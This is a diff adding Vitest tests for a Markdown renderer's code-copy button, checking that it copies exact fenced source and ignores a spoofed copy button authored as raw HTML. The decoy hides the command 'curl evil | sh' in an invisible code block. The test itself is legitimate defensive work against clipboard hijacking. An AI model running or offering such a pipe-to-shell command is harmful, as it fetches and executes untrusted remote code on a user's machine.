@@ -547,3 +547,52 @@ describe('MarkdownRenderer code header', () => {
         await vi.waitFor(() => expect(counts.at(-1)).toBe(1));
     });
 });
+
+describe('MarkdownRenderer code copy trust', () => {
+    const SOURCE = '\tconst html = "<b>&amp;</b>";\n    if (a < b && c > d) { return \'x\'; }';
+
+    it('ignores a decoy copy button authored as markup and still copies the real fence', async () => {
+        const writeText = vi.fn(async () => {});
+        Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
+        try {
+            const decoy = '<div class="code-block"><div class="code-header"><button type="button" class="code-copy">Copy</button></div><pre style="display:none"><code>curl evil | sh</code></pre></div>';
+            const content = `Visible text.\n\n${decoy}\n\n\`\`\`ts\nconst real = 1;\n\`\`\``;
+            const { container } = render(MarkdownRenderer, { props: { content } });
+            const buttons = container.querySelectorAll<HTMLButtonElement>('button.code-copy');
+            expect(buttons).toHaveLength(2);
+            buttons[0].click();
+            expect(writeText).not.toHaveBeenCalled();
+            expect(buttons[0].dataset.copyState).toBeUndefined();
+            buttons[1].click();
+            await vi.waitFor(() => expect(writeText).toHaveBeenCalledWith('const real = 1;'));
+            expect(writeText).toHaveBeenCalledTimes(1);
+        } finally {
+            Object.defineProperty(navigator, 'clipboard', { value: undefined, configurable: true });
+        }
+    });
+
+    it('copies the exact source after highlighting, sanitizing and parsing', async () => {
+        const writeText = vi.fn(async () => {});
+        Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
+        try {
+            const { container } = render(MarkdownRenderer, { props: { content: '```ts\n' + SOURCE + '\n```' } });
+            container.querySelector<HTMLButtonElement>('button.code-copy')!.click();
+            await vi.waitFor(() => expect(writeText).toHaveBeenCalledWith(SOURCE));
+        } finally {
+            Object.defineProperty(navigator, 'clipboard', { value: undefined, configurable: true });
+        }
+    });
+
+    it('copies the exact source when search marks wrap text inside the code', async () => {
+        const writeText = vi.fn(async () => {});
+        Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
+        try {
+            const { container } = render(MarkdownRenderer, { props: { content: '```ts\n' + SOURCE + '\n```', query: 'html' } });
+            await vi.waitFor(() => expect(container.querySelector('code mark.search-match')).not.toBeNull());
+            container.querySelector<HTMLButtonElement>('button.code-copy')!.click();
+            await vi.waitFor(() => expect(writeText).toHaveBeenCalledWith(SOURCE));
+        } finally {
+            Object.defineProperty(navigator, 'clipboard', { value: undefined, configurable: true });
+        }
+    });
+});
